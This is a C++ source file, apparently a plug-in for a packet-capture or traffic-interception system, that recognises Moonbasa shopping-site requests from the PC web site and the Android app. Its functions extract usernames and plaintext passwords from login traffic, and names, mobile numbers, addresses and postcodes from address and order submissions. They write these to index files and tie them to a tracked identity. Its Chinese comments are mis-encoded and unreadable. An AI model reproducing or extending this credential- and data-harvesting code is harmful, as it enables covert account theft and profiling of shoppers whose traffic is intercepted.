#include "StdAfx.h"
#include "ShoppingMoonBsSa.h"

shopping::MoonBaSa::MoonBaSa(HttpSession *http_session, const string &pro_name) : Shopping(http_session, pro_name)
{
	
}

shopping::MoonBaSa::~MoonBaSa()
{
	
}

int shopping::MoonBaSa::IsMoonBaSa(HttpSession *http_session)
{
	//pc��¼��Ϣ
	if((http_session->m_Requestline.m_Host.Find("login.moonbasa.com")!=-1) &&  
		(http_session->m_Requestline.m_URI.Find("/home/userlogin")!=-1))
	{
		return kPCWebLogin;
	}
	//pc������ַ �޸ĵ�ַ
	if((http_session->m_Requestline.m_Host.Find("shopping.moonbasa.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/address/OrderAddressSubmit")!=-1))
	{
		return kPCWebAddAddress;
	}
	//pc�ύ����
	if((http_session->m_Requestline.m_Host.Find("shopping.moonbasa.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/Order/OrderSubmit")!=-1))
	{
		return kPCWebNewOrder;
	}
	//android��¼
	if((http_session->m_Requestline.m_Host.Find("mobileapi.moonbasa.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/service/invoke/APPMemberApi/Login")!=-1))
	{
		return kAndroidLogin;
	}
	//android������ַ
	if((http_session->m_Requestline.m_Host.Find("mobileapi.moonbasa.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/service/invoke/APPMemberApi/AddCustAddr")!=-1))
	{
		return kAndroidAddAddress;
	}
	//android�޸ĵ�ַ
	if((http_session->m_Requestline.m_Host.Find("mobileapi.moonbasa.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/service/invoke/APPMemberApi/UpdateCustAddr")!=-1))
	{
		return kAndroidEditAddress;
	}
	//android�ύ����
	if((http_session->m_Requestline.m_Host.Find("mobileapi.moonbasa.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/service/invoke/APPSPOrderApi/OrderSubmit")!=-1))
	{
		return kAndroidOrder;
	}
	return 0;
}

int shopping::MoonBaSa::Process(const char *packet,int action)
{
	//pc��¼��Ϣ
	if (action == kPCWebLogin)
	{
		return PCWebLogin(packet);
	}	
	//pc������ַ
	if (action == kPCWebAddAddress)
	{
		return PCWebAddAddress(packet);
	}
	//pc�ύ����
	if (action == kPCWebNewOrder)
	{
		return PCWebNewOrder(packet);
	}
	//android��¼
	if (action == kAndroidLogin)
	{
		return AndroidLogin(packet);
	}
	//android������ַ
	if (action == kAndroidAddAddress)
	{
		return AndroidAddAddress(packet);
	}
	//android�޸ĵ�ַ
	if (action == kAndroidEditAddress)
	{
		return AndroidEditAddress(packet);
	}
	//android�ύ����
	if (action == kAndroidOrder)
	{
		return AndroidOrder(packet);
	}
	return 0;
}

//pc��¼��Ϣ 
int shopping::MoonBaSa::PCWebLogin(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,"&","=");
	//�û���
	string username = ms_->GetValueFromMapByKey("txtLoginID");
	//����
	string password = ms_->GetValueFromMapByKey("txtLoginPwd");

    if (username.empty() || password.empty())
    {
		return 0;
    }
	WriteVirtualIdentity(username,"����");
	
	output_text_ = 
		"user=" + username + "\r\n" + 
		"pass=" + password + "\r\n" + 
		"state=��¼\r\n";	
	WriteIndexFile();
	return 1;
}

//pc������ַ
int shopping::MoonBaSa::PCWebAddAddress(const char *packet)
{	
	string src_data(packet);
	src_data = ms_->UrlDecode(src_data);

	ms_->SplitStringToMap(src_data,'&','=');
	//�ջ���
	name_=ms_->GetValueFromMapByKey("AccepterName",true);
	//��ַ
	address_ = ms_->GetValueFromMapByKey("Province",true) + 
		       ms_->GetValueFromMapByKey("City",true) +
			   ms_->GetValueFromMapByKey("District",true) +
			   ms_->GetValueFromMapByKey("Address",true);

	postcode_ =ms_->GetValueFromMapByKey("PostCode",true);
	//��ϵ
	string phone,mobile;
	//�ֻ���
	phone_ =ms_->GetValueFromMapByKey("Mobile",true);
	//����(����)
	string email=ms_->GetValueFromMapByKey("Email",true);
	//�ʱ�
	postcode_ = ms_->GetValueFromMapByKey("PostCode",true);
	//�ж�ID
	string id;
	id=ms_->GetValueFromMapByKey("ID",true);
	int n=atoi(id.c_str());
	if ( name_.empty() || phone_.empty() || address_.empty())
	{
		return 0;
	}
	if (n==0)
	{
		output_text_ = 
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"msg=" + address_ + "\r\n" + 
			"msgtype=" + postcode_ + "\r\n" +
			"state=������ַ\r\n";	
		WriteIndexFile();
	}
	else
	{
		output_text_ = 
			"nick=" + name_ + "\r\n" + 
			"oid=" + phone_ + "\r\n" + 
			"msg=" + address_ + "\r\n" + 
			"msgtype=" + postcode_ + "\r\n" +
			"state=�޸ĵ�ַ\r\n";		
	   WriteIndexFile();
	}
	return 0;
}

//pc�ύ����
int shopping::MoonBaSa::PCWebNewOrder(const char *packet)
{
	string src_data(packet);
	src_data=ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//�ռ���
	user_=ms_->GetValueFromMapByKey("Title",true);
	//��ַ
	address_ = ms_->GetValueFromMapByKey("invprovince",true) + 
			   ms_->GetValueFromMapByKey("invcity",true) + 
			   ms_->GetValueFromMapByKey("invdistrict",true);
    string ss = src_data;
	if (user_.empty() || address_.empty())
	{
		return 0;
	}
	output_text_ = 
		"nick=" + user_ + "\r\n" + 
		"msg=" + address_ + "\r\n" + 
		"state=�ύ����\r\n";
	WriteIndexFile();
    return 1;
}


//android��¼
int shopping::MoonBaSa::AndroidLogin(const char *packet)
{
	string src_data(packet);
	string tookit = "{\"logEntity\"";
	if (src_data.rfind(tookit) != -1)
	{
		src_data = src_data.substr(src_data.rfind(tookit));
	}
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	Json::Value value;
	Json::Reader reader;
	if (reader.parse(src_data,value))
	{
		//�û���
		user_ = value["loginName"].asString();
		//����
		password_ = value["pwd"].asString();
	}
    if (user_.empty() || password_.empty())
    {
		return 0;
    }
	WriteVirtualIdentity(user_,"����");	
	output_text_ = 
		"user=" + user_ + "\r\n" + 
		"pass=" + password_ + "\r\n" + 
		"state=��¼\r\n";	
	WriteIndexFile();
	return 1;
}

//android������ַ
int shopping::MoonBaSa::AndroidAddAddress(const char *packet)
{	
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	//json��ȡ����
	Json::Value value;
	Json::Reader reader;
	if (reader.parse(src_data,value))
	{
		Json::Value custAddrEntity = value["custAddrEntity"];
		//����
		name_ = custAddrEntity["accepterName"].asString();
		//�绰
		phone_ = custAddrEntity["mobile"].asString();
		//��ַ
		address_ =  custAddrEntity["country"].asString() +
					custAddrEntity["province"].asString() +
					custAddrEntity["city"].asString() +
					custAddrEntity["address"].asString();
		//�ʱ�
		postcode_ = custAddrEntity["postCode"].asString();
	}
	if ( name_.empty() || phone_.empty() || address_.empty())
	{
		return 0;
	}
	output_text_ = 
		"nick=" + name_ + "\r\n" + 
		"oid=" + phone_ + "\r\n" + 
		"msg=" + address_ + "\r\n" + 
		"msgtype=" + postcode_ + "\r\n" +
		"state=������ַ\r\n";	
	WriteIndexFile();
	return 0;
}

//android�޸ĵ�ַ
int shopping::MoonBaSa::AndroidEditAddress(const char *packet)
{	
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	//json��ȡ����
	Json::Value value;
	Json::Reader reader;
	if (reader.parse(src_data,value))
	{
		Json::Value custAddrEntity = value["custAddrEntity"];
		//����
		name_ = custAddrEntity["accepterName"].asString();
		//�绰
		phone_ = custAddrEntity["mobile"].asString();
		//��ַ
		address_ =  custAddrEntity["country"].asString() +
			custAddrEntity["province"].asString() +
			custAddrEntity["city"].asString() +
			custAddrEntity["address"].asString();
		//�ʱ�
		postcode_ = custAddrEntity["postCode"].asString();
	}
	if ( name_.empty() || phone_.empty() || address_.empty())
	{
		return 0;
	}
	output_text_ = 
		"nick=" + name_ + "\r\n" + 
		"oid=" + phone_ + "\r\n" + 
		"msg=" + address_ + "\r\n" + 
		"msgtype=" + postcode_ + "\r\n" +
		"state=�޸ĵ�ַ\r\n";	
	WriteIndexFile();
	return 0;
}

//android�ύ����
int shopping::MoonBaSa::AndroidOrder(const char *packet)
{
	string src_data(packet);
	src_data=ms_->UTF8ToGBK(UrlDecode(src_data));

	//json��ȡ����
	Json::Value value;
	Json::Reader reader;
	if (reader.parse(src_data,value))
	{
		Json::Value orderform = value["orderform"];
		//����
		name_ = orderform["cusName"].asString();
		//�绰
		phone_ = orderform["mobilePhone"].asString();
		Json::Value address = value["address"];
		//��ַ
		address_ = address["Country"].asString() +
			       address["Province"].asString() +
				   address["City"].asString() + 
				   address["District"].asString();
		//�ʱ�
		postcode_ = address["PostCode"].asString();

	}
	if (name_.empty() || phone_.empty())
	{
		return 0;
	}
	output_text_ = 
		"nick=" + name_ + "\r\n" + 
		"oid=" + phone_ + "\r\n" + 
		"msg=" + address_ + "\r\n" + 
		"msgtype=" + postcode_ + "\r\n" +
		"state=�ύ����\r\n";
	WriteIndexFile();
    return 1;
}
